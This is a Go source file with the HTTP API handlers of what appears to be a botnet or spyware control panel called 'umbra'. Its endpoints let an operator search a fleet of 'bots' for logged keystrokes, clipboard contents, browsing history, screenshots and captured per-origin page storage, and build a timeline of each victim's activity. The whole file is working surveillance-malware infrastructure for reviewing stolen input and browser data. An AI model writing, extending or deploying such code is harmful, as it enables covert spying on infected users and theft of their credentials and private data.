package api

import (
	"errors"
	"net/http"
	"sort"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/umbra/internal/db/models"
)

// InvestigationAPI is fleet search, per-bot timeline, and alerts.
type InvestigationAPI struct {
	DB *gorm.DB
}

func parseTimeBounds(r *http.Request) (start, end time.Time) {
	if v := r.URL.Query().Get("startTime"); v != "" {
		start, _ = time.Parse(time.RFC3339, v)
	}
	if v := r.URL.Query().Get("endTime"); v != "" {
		end, _ = time.Parse(time.RFC3339, v)
	}
	return start, end
}

func applyTime(tx *gorm.DB, start, end time.Time) *gorm.DB {
	if !start.IsZero() {
		tx = tx.Where("timestamp >= ?", start)
	}
	if !end.IsZero() {
		tx = tx.Where("timestamp <= ?", end)
	}
	return tx
}

func likeContains(q string) string {
	escaped := strings.ReplaceAll(strings.ToLower(q), `\`, `\\`)
	escaped = strings.ReplaceAll(escaped, "%", `\%`)
	escaped = strings.ReplaceAll(escaped, "_", `\_`)
	return "%" + escaped + "%"
}

// ClipboardLogs is GET /api/v1/clipboard-logs?id=&limit=&offset=&startTime=&endTime=
func (a *MediaAPI) ClipboardLogs(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, offset := parseLimitOffset(r, 50)
	start, end := parseTimeBounds(r)
	tx := applyTime(a.DB.Where("bot_id = ?", id), start, end)
	var rows []models.BotClipboardLog
	if err := tx.Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}

// SearchHit is one fleet-search match.
type SearchHit struct {
	ID        uuid.UUID `json:"id"`
	BotID     uuid.UUID `json:"bot_id"`
	BotName   string    `json:"bot_name"`
	Kind      string    `json:"kind"`
	URL       string    `json:"url,omitempty"`
	Title     string    `json:"title,omitempty"`
	Snippet   string    `json:"snippet"`
	Timestamp time.Time `json:"timestamp"`
}

func parseKinds(raw string) map[string]bool {
	if strings.TrimSpace(raw) == "" {
		return map[string]bool{"keyboard": true, "clipboard": true, "nav": true, "alert": true}
	}
	out := map[string]bool{}
	for _, k := range strings.Split(raw, ",") {
		k = strings.TrimSpace(strings.ToLower(k))
		if k != "" {
			out[k] = true
		}
	}
	return out
}

// Search is GET /api/v1/search?q=&kinds=&limit=
func (a *InvestigationAPI) Search(w http.ResponseWriter, r *http.Request) {
	q := strings.TrimSpace(r.URL.Query().Get("q"))
	if len(q) < 2 {
		JSONErr(w, http.StatusBadRequest, "q must be at least 2 characters")
		return
	}
	limit, _ := parseLimitOffset(r, 50)
	if limit > 200 {
		limit = 200
	}
	kinds := parseKinds(r.URL.Query().Get("kinds"))
	pat := likeContains(q)
	names := map[uuid.UUID]string{}
	var bots []models.Bot
	_ = a.DB.Select("id", "name").Find(&bots).Error
	for _, b := range bots {
		names[b.ID] = b.Name
	}

	var hits []SearchHit
	appendHit := func(id, botID uuid.UUID, kind, url, title, snippet string, ts time.Time) {
		hits = append(hits, SearchHit{
			ID: id, BotID: botID, BotName: names[botID], Kind: kind,
			URL: url, Title: title, Snippet: snippet, Timestamp: ts,
		})
	}

	if kinds["keyboard"] {
		var rows []models.BotKeyboardLog
		_ = a.DB.Where("LOWER(keys) LIKE ? OR LOWER(url) LIKE ? OR LOWER(title) LIKE ?", pat, pat, pat).
			Order("timestamp DESC").Limit(limit).Find(&rows).Error
		for _, row := range rows {
			appendHit(row.ID, row.BotID, "keyboard", row.URL, row.Title, row.Keys, row.Timestamp)
		}
	}
	if kinds["clipboard"] {
		var rows []models.BotClipboardLog
		_ = a.DB.Where("LOWER(text) LIKE ? OR LOWER(url) LIKE ?", pat, pat).
			Order("timestamp DESC").Limit(limit).Find(&rows).Error
		for _, row := range rows {
			appendHit(row.ID, row.BotID, "clipboard", row.URL, row.Title, row.Text, row.Timestamp)
		}
	}
	if kinds["nav"] {
		var rows []models.BotNavEvent
		_ = a.DB.Where("LOWER(url) LIKE ? OR LOWER(title) LIKE ?", pat, pat).
			Order("timestamp DESC").Limit(limit).Find(&rows).Error
		for _, row := range rows {
			appendHit(row.ID, row.BotID, "nav", row.URL, row.Title, row.URL, row.Timestamp)
		}
	}
	if kinds["alert"] {
		var rows []models.BotAlert
		_ = a.DB.Where("LOWER(title) LIKE ? OR LOWER(url) LIKE ? OR LOWER(detail) LIKE ?", pat, pat, pat).
			Order("timestamp DESC").Limit(limit).Find(&rows).Error
		for _, row := range rows {
			appendHit(row.ID, row.BotID, "alert", row.URL, row.Title, row.Detail, row.Timestamp)
		}
	}

	sort.Slice(hits, func(i, j int) bool { return hits[i].Timestamp.After(hits[j].Timestamp) })
	if len(hits) > limit {
		hits = hits[:limit]
	}
	if hits == nil {
		hits = []SearchHit{}
	}
	JSONOK(w, hits)
}

// TimelineItem is one row on the investigation cinema.
type TimelineItem struct {
	ID           string         `json:"id"`
	Kind         string         `json:"kind"`
	Timestamp    time.Time      `json:"timestamp"`
	URL          string         `json:"url,omitempty"`
	Title        string         `json:"title,omitempty"`
	Text         string         `json:"text,omitempty"`
	ScreenshotID string         `json:"screenshot_id,omitempty"`
	Extra        map[string]any `json:"extra,omitempty"`
}

// Timeline is GET /api/v1/bots/{bot_id}/timeline or ?id=
func (a *InvestigationAPI) Timeline(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	if idStr == "" {
		idStr = r.URL.Query().Get("id")
	}
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, _ := parseLimitOffset(r, 200)
	if limit > 500 {
		limit = 500
	}
	start, end := parseTimeBounds(r)

	var items []TimelineItem
	push := func(it TimelineItem) { items = append(items, it) }

	var navs []models.BotNavEvent
	_ = applyTime(a.DB.Where("bot_id = ?", id), start, end).Order("timestamp DESC").Limit(limit).Find(&navs).Error
	for _, row := range navs {
		push(TimelineItem{ID: row.ID.String(), Kind: "nav", Timestamp: row.Timestamp, URL: row.URL, Title: row.Title, Extra: map[string]any{"transition": row.TransitionType}})
	}
	var keys []models.BotKeyboardLog
	_ = applyTime(a.DB.Where("bot_id = ?", id), start, end).Order("timestamp DESC").Limit(limit).Find(&keys).Error
	for _, row := range keys {
		push(TimelineItem{ID: row.ID.String(), Kind: "keyboard", Timestamp: row.Timestamp, URL: row.URL, Title: row.Title, Text: row.Keys, Extra: map[string]any{"field": row.Field}})
	}
	var clips []models.BotClipboardLog
	_ = applyTime(a.DB.Where("bot_id = ?", id), start, end).Order("timestamp DESC").Limit(limit).Find(&clips).Error
	for _, row := range clips {
		push(TimelineItem{ID: row.ID.String(), Kind: "clipboard", Timestamp: row.Timestamp, URL: row.URL, Title: row.Title, Text: row.Text, Extra: map[string]any{"action": row.Action}})
	}
	var shots []models.BotScreenshot
	_ = applyTime(a.DB.Where("bot_id = ?", id), start, end).Order("timestamp DESC").Limit(limit).Find(&shots).Error
	for _, row := range shots {
		push(TimelineItem{ID: row.ID.String(), Kind: "screenshot", Timestamp: row.Timestamp, URL: row.URL, Title: row.Title, ScreenshotID: row.ID.String()})
	}
	var deltas []models.BotDeltaEvent
	_ = applyTime(a.DB.Where("bot_id = ?", id), start, end).Order("timestamp DESC").Limit(limit).Find(&deltas).Error
	for _, row := range deltas {
		push(TimelineItem{ID: row.ID.String(), Kind: row.Kind, Timestamp: row.Timestamp, URL: row.URL, Title: row.Title, Text: row.Detail, Extra: map[string]any{"action": row.Action}})
	}
	var alerts []models.BotAlert
	_ = applyTime(a.DB.Where("bot_id = ?", id), start, end).Order("timestamp DESC").Limit(limit).Find(&alerts).Error
	for _, row := range alerts {
		push(TimelineItem{ID: row.ID.String(), Kind: "alert", Timestamp: row.Timestamp, URL: row.URL, Title: row.Title, Text: row.Detail, Extra: map[string]any{"severity": row.Severity}})
	}

	sort.Slice(items, func(i, j int) bool { return items[i].Timestamp.After(items[j].Timestamp) })
	if len(items) > limit {
		items = items[:limit]
	}
	if items == nil {
		items = []TimelineItem{}
	}
	JSONOK(w, items)
}

type alertView struct {
	ID           uuid.UUID `json:"id"`
	BotID        uuid.UUID `json:"bot_id"`
	Kind         string    `json:"kind"`
	Severity     string    `json:"severity"`
	Title        string    `json:"title"`
	URL          string    `json:"url"`
	Detail       string    `json:"detail"`
	Timestamp    time.Time `json:"timestamp"`
	Acknowledged bool      `json:"acknowledged"`
}

// Alerts is GET /api/v1/alerts?id=&unacked=1&limit=
func (a *InvestigationAPI) Alerts(w http.ResponseWriter, r *http.Request) {
	limit, offset := parseLimitOffset(r, 50)
	tx := a.DB.Model(&models.BotAlert{})
	if idStr := r.URL.Query().Get("id"); idStr != "" {
		id, err := uuid.Parse(idStr)
		if err != nil {
			JSONErr(w, http.StatusBadRequest, "invalid id")
			return
		}
		tx = tx.Where("bot_id = ?", id)
	}
	if r.URL.Query().Get("unacked") == "1" || r.URL.Query().Get("unacked") == "true" {
		tx = tx.Where("acknowledged = ?", false)
	}
	var rows []models.BotAlert
	if err := tx.Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	out := make([]alertView, 0, len(rows))
	for _, row := range rows {
		out = append(out, alertView{
			ID: row.ID, BotID: row.BotID, Kind: row.Kind, Severity: row.Severity,
			Title: row.Title, URL: row.URL, Detail: row.Detail, Timestamp: row.Timestamp,
			Acknowledged: row.Acknowledged,
		})
	}
	JSONOK(w, out)
}

// AckAlert is POST /api/v1/alerts/{id}/ack
func (a *InvestigationAPI) AckAlert(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(chi.URLParam(r, "id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	res := a.DB.Model(&models.BotAlert{}).Where("id = ?", id).Update("acknowledged", true)
	if res.Error != nil {
		JSONErr(w, http.StatusInternalServerError, "update failed")
		return
	}
	if res.RowsAffected == 0 {
		JSONErr(w, http.StatusNotFound, "alert not found")
		return
	}
	JSONOK(w, map[string]any{"acknowledged": true})
}

// UnackedCount is GET /api/v1/alerts/unacked-count
func (a *InvestigationAPI) UnackedCount(w http.ResponseWriter, r *http.Request) {
	var n int64
	if err := a.DB.Model(&models.BotAlert{}).Where("acknowledged = ?", false).Count(&n).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, map[string]any{"count": n})
}

// PageStorage is GET /api/v1/bots/{bot_id}/page-storage
func (a *InvestigationAPI) PageStorage(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	if idStr == "" {
		idStr = r.URL.Query().Get("id")
	}
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var row models.BotPageStorage
	if err := a.DB.Where("bot_id = ?", id).First(&row).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			JSONOK(w, map[string]any{"origins": []any{}, "captured_at": nil})
			return
		}
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, map[string]any{"origins": row.Origins, "captured_at": row.CapturedAt})
}

// NavEvents is GET /api/v1/nav-events?id=
func (a *InvestigationAPI) NavEvents(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, offset := parseLimitOffset(r, 50)
	start, end := parseTimeBounds(r)
	var rows []models.BotNavEvent
	if err := applyTime(a.DB.Where("bot_id = ?", id), start, end).
		Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}
